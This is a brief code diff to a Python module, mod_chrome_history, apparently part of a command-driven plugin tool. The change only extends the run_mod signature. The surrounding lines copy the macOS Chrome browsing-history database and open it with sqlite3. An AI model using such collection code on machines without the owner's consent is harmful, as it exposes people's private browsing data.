@@ -15,7 +15,7 @@ class mod_chrome_history(mod_interface):
     def setup_mod(self):
         print(f'Module Setup (mod_chrome_history) called successfully!')
 
-    def run_mod(self, cmd = ""):
+    def run_mod(self, cmd="", param=""):
         shutil.copy2(expanduser("~") + '/Library/Application Support/Google/Chrome/Default/History', 'chrome_hist')
         con = sqlite3.connect('chrome_hist')
         cur = con.cursor()
